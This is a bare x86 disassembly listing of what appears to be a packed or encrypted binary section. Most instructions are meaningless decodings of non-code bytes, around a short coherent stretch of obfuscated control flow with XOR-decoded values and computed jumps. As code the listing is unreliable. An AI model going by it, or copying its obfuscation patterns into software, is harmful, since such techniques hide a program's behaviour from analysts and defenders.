  40f200:	mov    BYTE PTR [eax-0x57],0x29
  40f204:	sbb    edx,ebx
  40f206:	xor    DWORD PTR [ebx+ecx*1],0xffffffb5
  40f20a:	or     ch,al
  40f20c:	adc    ecx,DWORD PTR [eax]
  40f20e:	xor    ch,bl
  40f210:	cmp    al,0x34
  40f212:	jno    0x40f240
  40f214:	sub    BYTE PTR ds:0xd952f273,dh
  40f21a:	inc    ebp
  40f21b:	mov    cl,0x21
  40f21d:	out    0x28,al
  40f21f:	xchg   edi,eax
  40f220:	jae    0x40f1ff
  40f222:	bound  esp,QWORD PTR [eax+eiz*4+0x1d]
  40f226:	jp     0x40f270
  40f228:	push   0x830931cb
  40f22d:	int3   
  40f22e:	(bad)
  40f231:	mov    ds:0x2ddd8ef6,eax
  40f236:	pop    edx
  40f237:	push   esi
  40f238:	ret    
  40f239:	test   ch,cl
  40f23b:	je     0x40f294
  40f23d:	jge    0x40f1f5
  40f23f:	lods   eax,DWORD PTR ds:[esi]
  40f240:	scas   eax,DWORD PTR es:[edi]
  40f241:	into   
  40f242:	pop    ecx
  40f243:	into   
  40f244:	lock test DWORD PTR [esi+0x4],esi
  40f248:	xor    ch,0x20
  40f24b:	jns    0x40f2bf
  40f24d:	adc    ebx,DWORD PTR [esi-0x62724018]
  40f253:	outs   dx,BYTE PTR ds:[esi]
  40f254:	cmp    al,0xdd
  40f256:	hlt    
  40f257:	sbb    DWORD PTR [ebx+0x3720eb9e],edx
  40f25d:	pop    ecx
  40f25e:	pop    edi
  40f25f:	outs   dx,DWORD PTR ds:[esi]
  40f260:	int    0xe2
  40f262:	jmp    0x40f27f
  40f264:	in     eax,0x67
  40f266:	stos   DWORD PTR es:[edi],eax
  40f267:	ror    DWORD PTR [esi-0x2c],cl
  40f26a:	test   BYTE PTR [edx+0x6f],0x87
  40f26e:	inc    ecx
  40f26f:	and    al,0x72
  40f271:	inc    eax
  40f272:	in     al,0xb8
  40f274:	cwde   
  40f275:	cmp    DWORD PTR [ebx+0x73],0xfffffff7
  40f279:	xchg   edi,eax
  40f27a:	pop    edi
  40f27b:	and    eax,eax
  40f27d:	xor    BYTE PTR [ebx],dh
  40f27f:	stos   BYTE PTR es:[edi],al
  40f280:	add    BYTE PTR [ebp+0x46c2e755],bl
  40f286:	aad    0xd2
  40f288:	mov    ebp,0x862b718f
  40f28d:	in     al,dx
  40f28e:	and    edx,esp
  40f290:	in     al,dx
  40f291:	add    bl,BYTE PTR [ecx+0x45beb75b]
  40f297:	or     eax,0x40808035
  40f29c:	rcl    BYTE PTR [ecx+0x7e],0xb1
  40f2a0:	clc    
  40f2a1:	lds    ecx,FWORD PTR [edx]
  40f2a3:	jbe    0x40f2bf
  40f2a5:	fcomp  DWORD PTR [ebx]
  40f2a7:	sbb    BYTE PTR [edi],bh
  40f2a9:	iret   
  40f2aa:	faddp  st(1),st
  40f2ac:	mov    edx,0xb3c88b33
  40f2b1:	rcr    BYTE PTR ds:0xb3939019,0xc0
  40f2b8:	aas    
  40f2b9:	stc    
  40f2ba:	mov    edi,0x156b8363
  40f2bf:	mov    ds:0x425296f2,eax
  40f2c4:	popf   
  40f2c5:	out    dx,eax
  40f2c6:	ins    BYTE PTR es:[edi],dx
  40f2c7:	out    0xc1,al
  40f2c9:	(bad)  
  40f2cb:	outs   dx,BYTE PTR ds:[esi]
  40f2cc:	dec    esp
  40f2cd:	jne    0x40f2fe
  40f2cf:	jmp    0x40f25c
  40f2d1:	lock in eax,0xee
  40f2d4:	mov    ds:0x95860fa4,eax
  40f2d9:	jle    0x40f2b8
  40f2db:	loop   0x40f301
  40f2dd:	jbe    0x40f308
  40f2df:	add    al,0xcf
  40f2e1:	aaa    
  40f2e2:	(bad)  
  40f2e3:	fsub   QWORD PTR [esi+0x6c8434b8]
  40f2e9:	int3   
  40f2ea:	jnp    0x40f366
  40f2ec:	jnp    0x40f2a0
  40f2ee:	out    dx,al
  40f2ef:	into   
  40f2f0:	pop    edi
  40f2f1:	pop    ebp
  40f2f2:	cmp    al,0xb
  40f2f4:	mov    bh,0xef
  40f2f6:	ret    
  40f2f7:	(bad)  
  40f2f9:	xchg   ebp,eax
  40f2fa:	sbb    eax,0x4bc19515
  40f2ff:	cdq    
  40f300:	and    eax,0xfa057643
  40f305:	cmp    dh,BYTE PTR [esi+0x51b23d79]
  40f30b:	sbb    al,0x9b
  40f30d:	sahf   
  40f30e:	call   0x8890f6eb
  40f313:	rcl    BYTE PTR [ebp-0x1de5f0d0],1
  40f319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f31a:	dec    ebx
  40f31b:	dec    esi
  40f31c:	sbb    eax,0xa5f517b3
  40f321:	push   eax
  40f322:	call   0x55e0c592
  40f327:	mov    dl,0xe8
  40f329:	mul    BYTE PTR [edx+0x45]
  40f32c:	push   esi
  40f32d:	jmp    0xcf8c1586
  40f332:	out    0x27,al
  40f334:	out    0x63,eax
  40f336:	(bad)  
  40f337:	retf   
  40f338:	adc    dl,BYTE PTR [ebx]
  40f33a:	push   eax
  40f33b:	rol    BYTE PTR [esi+esi*8+0x4154d42],1
  40f342:	adc    eax,0x70cc4bfb
  40f347:	xchg   BYTE PTR [ebx-0x5aa669f5],dl
  40f34d:	push   0x18
  40f34f:	lea    eax,[edi+eiz*2+0x6f3dcb81]
  40f356:	pop    ds
  40f357:	cwde   
  40f358:	sbb    DWORD PTR [eax+0x39],ecx
  40f35b:	adc    BYTE PTR [esi+0x24bbd51d],dl
  40f361:	and    DWORD PTR [edi-0x9],edx
  40f364:	mov    ah,0x30
  40f366:	jns    0x40f3db
  40f368:	cs push ebx
  40f36a:	outs   dx,DWORD PTR ds:[esi]
  40f36b:	pushf  
  40f36c:	jae    0x40f320
  40f36e:	add    BYTE PTR [edx],ah
  40f370:	push   edi
  40f371:	sbb    DWORD PTR [eax+0x24],edx
  40f374:	(bad)  
  40f375:	or     esp,esi
  40f377:	pop    eax
  40f378:	mov    cl,0xff
  40f37a:	in     eax,0xf6
  40f37c:	push   0xb4d3b679
  40f381:	mov    bl,0xbb
  40f383:	pop    edi
  40f384:	(bad)  
  40f385:	mov    ebp,0x7ae84d43
  40f38a:	(bad)  [ebp-0x4b0f1cd9]
  40f390:	sti    
  40f391:	mov    bh,0x25
  40f393:	pop    ds
  40f394:	cmp    al,0x7
  40f396:	outs   dx,DWORD PTR ds:[esi]
  40f397:	adc    BYTE PTR [edx],0x22
  40f39a:	or     al,0x5
  40f39c:	retf   0x9fc8
  40f39f:	in     eax,0xa0
  40f3a1:	(bad)  
  40f3a2:	pop    ss
  40f3a3:	ret    0x8e48
  40f3a6:	lods   eax,DWORD PTR ds:[esi]
  40f3a7:	out    dx,al
  40f3a8:	lock or DWORD PTR [edi],edx
  40f3ab:	es jge 0x40f3e2
  40f3ae:	ins    DWORD PTR es:[edi],dx
  40f3af:	mov    es,WORD PTR [esi]
  40f3b1:	mov    ds:0x935aad53,eax
  40f3b6:	push   esi
  40f3b7:	(bad)  
  40f3b8:	sub    eax,esi
  40f3ba:	scas   eax,DWORD PTR es:[edi]
  40f3bb:	xchg   ecx,eax
  40f3bc:	ins    BYTE PTR es:[edi],dx
  40f3bd:	fistp  QWORD PTR [edx]
  40f3bf:	test   eax,0xa52679b4
  40f3c4:	xor    DWORD PTR [ebx+0x7056eb3c],edx
  40f3ca:	retf   
  40f3cb:	lahf   
  40f3cc:	arpl   WORD PTR [ebx-0x5394efed],dx
  40f3d2:	jae    0x40f35e
  40f3d4:	call   0xf5a:0x33fa47c1
  40f3db:	shl    DWORD PTR [edi-0x50],0x81
  40f3df:	push   esi
  40f3e0:	cmp    eax,0x3d9c2912
  40f3e5:	aas    
  40f3e6:	mov    ebx,edi
  40f3e8:	sahf   
  40f3e9:	outs   dx,DWORD PTR ds:[esi]
  40f3ea:	aad    0x79
  40f3ec:	xor    eax,0x669503f0
  40f3f1:	sahf   
  40f3f2:	fimul  WORD PTR [eax+ebp*8]
  40f3f5:	fwait
  40f3f6:	leave  
  40f3f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3f8:	push   0xffffffb2
  40f3fa:	js     0x40f407
  40f3fc:	call   0x2a6f:0x5b3926ec
  40f403:	adc    eax,0xbae0a4a7
  40f408:	jb     0x40f439
  40f40a:	std    
  40f40b:	or     DWORD PTR [ebx+ebp*4+0x76],esi
  40f40f:	push   ds
  40f410:	test   al,0x31
  40f412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f413:	add    al,0xb
  40f415:	mov    DWORD PTR [eax+esi*1-0x25cee353],esp
  40f41c:	out    0x68,al
  40f41e:	leave  
  40f41f:	(bad)  
  40f420:	retf   
  40f421:	mov    dh,0xc
  40f423:	jo     0x40f40d
  40f425:	mov    al,ds:0x6be60aff
  40f42a:	mov    BYTE PTR [ebx-0xf],ah
  40f42d:	mov    ecx,0x8ea3cd76
  40f432:	inc    esp
  40f433:	xchg   edi,eax
  40f434:	aaa    
  40f435:	jo     0x40f40a
  40f437:	xor    al,0x2a
  40f439:	push   ss
  40f43a:	pop    edi
  40f43b:	mov    ch,0x7
  40f43d:	hlt    
  40f43e:	jp     0x40f3df
  40f440:	cmp    BYTE PTR [ecx],0xeb
  40f443:	jb     0x40f419
  40f445:	or     BYTE PTR [ebx+ecx*2-0x16],0x8c
  40f44a:	pushf  
  40f44b:	push   0xffffffbc
  40f44d:	pusha  
  40f44e:	ficomp DWORD PTR [ebx+0x541c8595]
  40f454:	fs shl bl,0x9d
  40f458:	mov    cl,BYTE PTR [ebx]
  40f45a:	sbb    cl,BYTE PTR [esi-0x1b]
  40f45d:	cmc    
  40f45e:	add    dh,dl
  40f460:	das    
  40f461:	or     al,0x94
  40f463:	adc    al,0xae
  40f465:	mov    cl,0x17
  40f467:	cwde   
  40f468:	dec    ebp
  40f469:	push   esp
  40f46a:	add    eax,0x9d35ad4d
  40f46f:	pusha  
  40f470:	sbb    cl,ch
  40f472:	xchg   edi,eax
  40f473:	adc    eax,0x9ec83e7b
  40f478:	repnz pop edi
  40f47a:	stos   DWORD PTR es:[edi],eax
  40f47b:	cmp    DWORD PTR [ebx],eax
  40f47d:	test   DWORD PTR [esi+0x17],esi
  40f480:	and    bl,BYTE PTR [edi+0x359f04a8]
  40f486:	sbb    eax,0x56648e5f
  40f48b:	push   es
  40f48c:	push   esi
  40f48d:	clc    
  40f48e:	in     eax,0x37
  40f490:	jl     0x40f4ea
  40f492:	scas   eax,DWORD PTR es:[edi]
  40f493:	inc    ebx
  40f494:	or     ah,dl
  40f496:	and    esp,DWORD PTR [esi]
  40f498:	mov    BYTE PTR [edi-0x7f],dl
  40f49b:	mov    bl,0xeb
  40f49d:	sbb    al,0xab
  40f49f:	mov    DWORD PTR ds:0x460be0ca,ecx
  40f4a5:	ja     0x40f47b
  40f4a7:	jmp    0x40f447
  40f4a9:	mov    ds:0xd517a760,al
  40f4ae:	xchg   edx,eax
  40f4af:	sub    al,0xb1
  40f4b1:	xor    cl,al
  40f4b3:	mov    eax,ds:0x5b861b77
  40f4b8:	mov    ecx,0x3a596ad9
  40f4bd:	test   DWORD PTR [edx-0x3c],0x4789ec20
  40f4c4:	es push 0xffffff81
  40f4c7:	jne    0x40f4ea
  40f4c9:	aam    0x34
  40f4cb:	inc    ecx
  40f4cc:	(bad)  
  40f4cf:	pusha  
  40f4d0:	retf   0xf2aa
  40f4d3:	ror    eax,1
  40f4d5:	cmp    al,0xab
  40f4d7:	aas    
  40f4d8:	stos   BYTE PTR es:[edi],al
  40f4d9:	shl    BYTE PTR [eax],cl
  40f4db:	aad    0x5d
  40f4dd:	xor    cl,bh
  40f4df:	ror    dh,0xeb
  40f4e2:	test   ecx,edx
  40f4e4:	icebp  
  40f4e5:	bound  ebp,QWORD PTR [ebp+0x650b0cb6]
  40f4eb:	jbe    0x40f515
  40f4ed:	jg     0x40f4ad
  40f4ef:	jmp    0xf4c2:0x2dbe59c4
  40f4f6:	adc    eax,0x600e8ec5
  40f4fb:	jge    0x40f4d7
  40f4fd:	xchg   ebx,eax
  40f4fe:	pop    edi
  40f4ff:	fsub   st,st(3)
  40f501:	jbe    0x40f4c2
  40f503:	mov    bh,BYTE PTR [eax+0x6e]
  40f506:	sub    dh,ah
  40f508:	mov    dh,0x8f
  40f50a:	shl    DWORD PTR [esi-0x69214cb4],cl
  40f510:	xlat   BYTE PTR ds:[ebx]
  40f511:	ins    DWORD PTR es:[edi],dx
  40f512:	lods   eax,DWORD PTR ds:[esi]
  40f513:	rol    BYTE PTR cs:[esi+0x47359bcf],0xaa
  40f51b:	fist   WORD PTR [edx]
  40f51d:	add    cl,dh
  40f51f:	imul   ebx,DWORD PTR [ebx],0xffffff87
  40f522:	or     dh,BYTE PTR [eax]
  40f524:	fsub   st,st(4)
  40f526:	mov    eax,0x477392fe
  40f52c:	pusha  
  40f52d:	or     edi,DWORD PTR [eax+0x461ab130]
  40f533:	pusha  
  40f534:	jno    0x40f50a
  40f536:	xchg   BYTE PTR [ecx],al
  40f538:	jno    0x40f4fd
  40f53a:	imul   DWORD PTR [edx-0x13db28df]
  40f540:	loopne 0x40f5a6
  40f542:	dec    BYTE PTR [esp+ecx*1+0x3a]
  40f546:	and    al,0x4b
  40f548:	add    esi,ebx
  40f54a:	jbe    0x40f4fc
  40f54c:	lds    ebp,FWORD PTR [esi+0x27bdf520]
  40f552:	mov    ss,WORD PTR [eax+0x5f]
  40f555:	xchg   ebp,eax
  40f556:	inc    esp
  40f557:	add    BYTE PTR [ebx+0x20],al
  40f55a:	pusha  
  40f55b:	mov    eax,0xe91768c
  40f560:	mov    WORD PTR [eax],es
  40f562:	retf   0xe17e
  40f565:	mov    ebp,0x5cc66c5a
  40f56a:	xor    eax,0x6f835067
  40f56f:	test   al,0xa4
  40f571:	cmp    eax,0xfe13c1b4
  40f576:	cmp    eax,DWORD PTR ds:0x295086ac
  40f57c:	xchg   ebx,eax
  40f57d:	les    ebx,FWORD PTR ds:0xe6d3b0dd
  40f583:	fs inc esi
  40f585:	add    DWORD PTR [edx],ecx
  40f587:	repnz pusha 
  40f589:	test   BYTE PTR [ebx-0x62],bl
  40f58c:	pop    ebp
  40f58d:	xchg   edi,eax
  40f58e:	rcr    BYTE PTR es:[edi],cl
  40f591:	sbb    al,0xa4
  40f593:	out    dx,al
  40f594:	lahf   
  40f595:	sub    eax,0xb885ce5e
  40f59a:	pusha  
  40f59b:	jns    0x40f5ad
  40f59d:	add    al,0xf5
  40f59f:	jmp    0x5bd5efd6
  40f5a4:	xor    BYTE PTR [edi+edi*8],ah
  40f5a7:	inc    edi
  40f5a8:	out    dx,al
  40f5a9:	les    esp,FWORD PTR [ebx-0x58]
  40f5ac:	add    BYTE PTR [ecx],dh
  40f5ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5af:	stos   DWORD PTR es:[edi],eax
  40f5b0:	add    BYTE PTR fs:[ecx+0x458bc83b],ah
  40f5b7:	cld    
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi-0x5ca3da05]
  40f687:	fnstcw WORD PTR [eax+0x54]
  40f68a:	ret    
  40f68b:	scas   eax,DWORD PTR es:[edi]
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0x51
  40f693:	or     BYTE PTR [ecx-0x8f88dd4],bl
  40f699:	xor    DWORD PTR [edx-0x51e0f16b],ecx
  40f69f:	add    al,0x93
  40f6a1:	rcr    ecx,0x88
  40f6a4:	(bad)  
  40f6a5:	cdq    
  40f6a6:	call   0xde988e10
  40f6ab:	shr    BYTE PTR [ecx+0x42],1
  40f6ae:	push   0xa1d5a952
  40f6b3:	push   ebp
  40f6b4:	shl    DWORD PTR [edx-0x12],cl
  40f6b7:	push   edx
  40f6b8:	dec    esi
  40f6b9:	imul   ebp,DWORD PTR [esi+0x13d507ba],0xffffffc2
  40f6c0:	test   edi,edx
  40f6c2:	clc    
  40f6c3:	or     eax,0x454c3cc6
  40f6c8:	hlt    
  40f6c9:	mov    esp,0x601f2073
  40f6ce:	lds    ebx,FWORD PTR [ecx+0x3d58e668]
  40f6d4:	sub    eax,0x58e32921
  40f6d9:	and    DWORD PTR [esi-0x61284ec3],0xffffffec
  40f6e0:	sti    
  40f6e1:	pop    ebx
  40f6e2:	add    al,BYTE PTR [ecx-0x3afefcb1]
  40f6e8:	ret    
  40f6e9:	xchg   esp,eax
  40f6ea:	lods   eax,DWORD PTR ds:[esi]
  40f6eb:	mov    ch,0x82
  40f6ed:	inc    eax
  40f6ee:	sbb    BYTE PTR ds:0x9f47eb00,bh
  40f6f4:	nop
  40f6f5:	addr16 sahf 
  40f6f7:	imul   esi,esi,0xffffffed
  40f6fa:	push   0x63ecbbc3
  40f6ff:	cmp    eax,0x50921d4f
  40f704:	pop    edx
  40f705:	int3   
  40f706:	or     dh,bl
  40f708:	test   eax,0x727b0a56
  40f70d:	iret   
  40f70e:	push   edx
  40f70f:	enter  0x2b8a,0x7
  40f713:	add    eax,0x3d72947e
  40f718:	retf   
  40f719:	or     al,0x90
  40f71b:	mov    dh,0xaa
  40f71d:	or     al,0xcd
  40f71f:	mov    esp,0x98a96b6e
  40f724:	dec    edx
  40f725:	lahf   
  40f726:	fndisi(8087 only) 
  40f728:	inc    ecx
  40f729:	push   0xffffffa5
  40f72b:	rol    ebx,cl
  40f72d:	iret   
  40f72e:	or     esp,DWORD PTR [edx-0x27]
  40f731:	hlt    
  40f732:	shl    dl,cl
  40f734:	leave  
  40f735:	adc    bh,cl
  40f737:	jp     0x40f76c
  40f739:	aad    0x78
  40f73b:	xor    DWORD PTR [esi+0x2d],edx
  40f73e:	gs aas 
  40f740:	jne    0x40f6fd
  40f742:	dec    ebp
  40f743:	aad    0x38
  40f745:	mov    ebx,0x5d28edc
  40f74a:	mul    dh
  40f74c:	or     al,0x37
  40f74e:	jmp    0x444c:0x356da5f3
  40f755:	adc    BYTE PTR [edx+0x470ef5fe],ah
  40f75b:	push   0xbdc5083e
  40f760:	push   es
  40f761:	mov    ecx,0x61cd77a
  40f766:	ss retf 
  40f768:	xchg   ebp,eax
  40f769:	xchg   ebp,eax
  40f76a:	addr16 daa 
  40f76c:	fcomp  QWORD PTR [edi]
  40f76e:	and    BYTE PTR [esi+eiz*4-0x34],al
  40f772:	inc    ebx
  40f773:	aam    0x3d
  40f775:	ret    0xa9e0
  40f778:	out    dx,eax
  40f779:	add    al,0xcc
  40f77b:	idiv   BYTE PTR [ebp+ebx*8-0x3c]
  40f77f:	adc    al,0x48
  40f781:	xchg   ebx,eax
  40f782:	push   0xffffff86
  40f784:	push   esi
  40f785:	fld    TBYTE PTR [ebx+edx*8-0x2259b7eb]
  40f78c:	jmp    0x40f800
  40f78e:	and    al,0x38
  40f790:	arpl   WORD PTR [eax-0x5e5a5bd6],si
  40f796:	xchg   ebx,eax
  40f797:	add    edi,DWORD PTR [ebx+0x18]
  40f79a:	fbstp  TBYTE PTR [edi]
  40f79c:	loop   0x40f788
  40f79e:	scas   eax,DWORD PTR es:[edi]
  40f79f:	sub    eax,DWORD PTR [eax]
  40f7a1:	aad    0xe7
  40f7a3:	(bad)  
  40f7a4:	and    dl,bh
  40f7a6:	out    0xcc,al
  40f7a8:	imul   ebx,DWORD PTR [ebp+0x63],0x1b55c55
  40f7af:	adc    DWORD PTR [edi+0x7c6ab42d],ebp
  40f7b5:	xchg   edx,eax
  40f7b6:	xlat   BYTE PTR ds:[ebx]
  40f7b7:	xchg   DWORD PTR [edi+0x2c429240],esp
  40f7bd:	pop    ecx
  40f7be:	scas   eax,DWORD PTR es:[edi]
  40f7bf:	inc    eax
  40f7c0:	mov    dh,0x11
  40f7c2:	daa    
  40f7c3:	pop    es
  40f7c4:	add    edx,DWORD PTR [ebx+0x47]
  40f7c7:	sbb    edi,esp
  40f7c9:	add    dl,0x7
  40f7cc:	shr    cl,cl
  40f7ce:	jb     0x40f80a
  40f7d0:	rcl    ch,cl
  40f7d2:	rcl    DWORD PTR [edi],cl
  40f7d4:	int3   
  40f7d5:	dec    edx
  40f7d6:	jae    0x40f7b1
  40f7d8:	xchg   esp,eax
  40f7d9:	jge    0x40f800
  40f7db:	mov    cs,WORD PTR [edi-0x1267437b]
  40f7e1:	lods   al,BYTE PTR ds:[esi]
  40f7e2:	leave  
  40f7e3:	mov    es,WORD PTR [ebp+eiz*4-0x545f3622]
  40f7ea:	pop    ebx
  40f7eb:	aaa    
  40f7ec:	add    eax,0x5277c1eb
  40f7f2:	add    ebp,DWORD PTR [esi-0x6b]
  40f7f5:	js     0x40f853
  40f7f7:	mov    ebx,0x957998b3
  40f7fc:	add    bh,BYTE PTR [ecx+0x53]
  40f7ff:	outs   dx,DWORD PTR ds:[esi]
  40f800:	lea    edx,[edx-0x12]
  40f803:	push   edx
  40f804:	arpl   WORD PTR [edx+0x28],bp
  40f807:	ret    0x7afd
  40f80a:	cmp    eax,0xe7d1fa97
  40f80f:	xchg   esi,eax
  40f810:	or     ecx,DWORD PTR ds:0x79f381c6
  40f816:	xchg   edx,eax
  40f817:	inc    edi
  40f818:	xchg   ebp,eax
  40f819:	add    bh,BYTE PTR [ebp+0x6c051452]
  40f81f:	jb     0x40f81e
  40f821:	in     eax,dx
  40f822:	outs   dx,DWORD PTR ds:[esi]
  40f823:	inc    ecx
  40f824:	mov    al,0x8a
  40f826:	rol    DWORD PTR [edx],1
  40f828:	dec    edi
  40f829:	jb     0x40f7c0
  40f82b:	rcl    DWORD PTR [ebx-0x4e8bd51d],0x79
  40f832:	outs   dx,BYTE PTR ds:[esi]
  40f833:	loope  0x40f835
  40f835:	cmp    BYTE PTR [ecx+0x797ef87b],al
  40f83b:	aad    0x41
  40f83d:	push   ebp
  40f83e:	rcr    DWORD PTR [esi],cl
  40f840:	gs aam 0x2b
  40f843:	loopne 0x40f83e
  40f845:	add    eax,0xb6fa21a9
  40f84a:	shr    DWORD PTR gs:[eax-0x6f],1
  40f84e:	or     eax,0xdd42bdb8
  40f853:	fimul  DWORD PTR [eax]
  40f855:	in     al,dx
  40f856:	mov    ebp,0x5a96c5be
  40f85b:	jecxz  0x40f7e4
  40f85d:	dec    ebx
  40f85e:	scas   eax,DWORD PTR es:[edi]
  40f85f:	xchg   edi,eax
  40f860:	fidiv  WORD PTR [ecx]
  40f862:	push   ebp
  40f863:	adc    eax,0x20492ccd
  40f868:	in     eax,dx
  40f869:	leave  
  40f86a:	dec    ecx
  40f86b:	ins    BYTE PTR es:[edi],dx
  40f86c:	xor    DWORD PTR [ebx+0x67],eax
  40f86f:	aad    0x39
  40f871:	adc    al,0x4
  40f873:	jbe    0x40f8c4
  40f875:	xor    al,BYTE PTR [edx]
  40f877:	in     eax,dx
  40f878:	fcom   QWORD PTR [eax]
  40f87a:	cwde   
  40f87b:	sbb    dl,BYTE PTR [edi+edi*8+0x534b05fe]
  40f882:	xchg   ecx,eax
  40f883:	vminps ymm0,ymm4,ymm2
  40f888:	push   es
  40f889:	nop
  40f88a:	int3   
  40f88b:	(bad)  
  40f88c:	jmp    0x40f89d
  40f88e:	pop    es
  40f88f:	sbb    eax,0xb7a5c1aa
  40f894:	jne    0x40f89e
  40f896:	pop    esi
  40f897:	neg    DWORD PTR [edi]
  40f899:	scas   al,BYTE PTR es:[edi]
  40f89a:	je     0x40f864
  40f89c:	inc    esi
  40f89d:	and    BYTE PTR es:[ecx-0x45c6ff0d],bh
  40f8a4:	or     bh,BYTE PTR ds:0x1df0edf3
  40f8aa:	jne    0x40f877
  40f8ac:	icebp  
  40f8ad:	inc    edi
  40f8ae:	scas   al,BYTE PTR es:[edi]
  40f8af:	(bad)  [esi]
  40f8b1:	hlt    
  40f8b2:	retf   0x2830
  40f8b5:	adc    ch,al
  40f8b7:	xor    BYTE PTR [esi],bh
  40f8b9:	push   cs
  40f8ba:	push   ecx
  40f8bb:	dec    esi
  40f8bc:	hlt    
  40f8bd:	stos   DWORD PTR es:[edi],eax
  40f8be:	leave  
  40f8bf:	hlt    
  40f8c0:	pop    ecx
  40f8c1:	fild   DWORD PTR [esi]
  40f8c3:	(bad)  [eax+0x37f8aec4]
  40f8c9:	jne    0x40f87b
  40f8cb:	loope  0x40f8bb
  40f8cd:	cli    
  40f8ce:	jno    0x40f912
  40f8d0:	mov    edx,DWORD PTR [edi+0x3e]
  40f8d3:	not    DWORD PTR [ebp+0x3]
  40f8d6:	mov    al,ds:0x68f74cb5
  40f8db:	jp     0x40f91d
  40f8dd:	outs   dx,DWORD PTR ds:[esi]
  40f8de:	fld    DWORD PTR [edx-0x14]
  40f8e1:	jno    0x40f8b3
  40f8e3:	pop    ecx
  40f8e4:	push   edi
  40f8e5:	inc    esi
  40f8e6:	(bad)  
  40f8e8:	xlat   BYTE PTR ds:[ebx]
  40f8e9:	in     al,0xee
  40f8eb:	pop    ebp
  40f8ec:	fstp   TBYTE PTR [edi-0x205e49ce]
  40f8f2:	mov    eax,0xc139b1f6
  40f8f7:	test   DWORD PTR [ebx-0x135be1ed],ebx
  40f8fd:	jg     0x40f8f5
  40f8ff:	xor    eax,0x72d1eb2a
  40f904:	dec    ecx
  40f905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f906:	cwde   
  40f907:	xor    BYTE PTR [eax+0x7b],dl
  40f90a:	aaa    
  40f90b:	pop    esi
  40f90c:	pop    esi
  40f90d:	push   ebx
  40f90f:	sbb    BYTE PTR [eax-0x79e75ba8],0xfe
  40f916:	(bad)  
  40f917:	enter  0x616c,0x1e
  40f91b:	test   ch,dh
  40f91d:	mov    edx,0x74e1a726
  40f922:	ja     0x40f8bf
  40f924:	imul   eax,ebx,0xee7a187e
  40f92a:	mov    ch,0x5a
  40f92c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f92d:	pop    esi
  40f92e:	jmp    0x40f905
  40f930:	inc    esp
  40f931:	xchg   ebp,eax
  40f932:	push   ecx
  40f933:	push   esi
  40f934:	jnp    0x40f9a9
  40f936:	stc    
  40f937:	out    dx,al
  40f938:	leave  
  40f939:	arpl   WORD PTR ds:0x9fd07f23,di
  40f93f:	mov    eax,0x95025efe
  40f944:	gs mov edx,0xeeb936eb
  40f94a:	ret    
  40f94b:	sbb    DWORD PTR [ebp+0x636c3cff],esi
  40f951:	out    dx,eax
  40f952:	mov    ah,0xab
  40f954:	popf   
  40f955:	sti    
  40f956:	call   0xd8f353b7
  40f95b:	jno    0x40f96b
  40f95d:	xor    DWORD PTR [ebx+0x41],esp
  40f960:	mov    eax,0xe6554461
  40f965:	rcl    DWORD PTR [eax+0x7],0x4e
  40f969:	scas   eax,DWORD PTR es:[edi]
  40f96a:	ss mov edi,edx
  40f96d:	jmp    0x7506:0x884fe4e6
  40f974:	scas   eax,DWORD PTR es:[edi]
  40f975:	pop    ss
  40f976:	mov    BYTE PTR [eiz*4+0x41971fcd],dl
  40f97d:	jg     0x40f9db
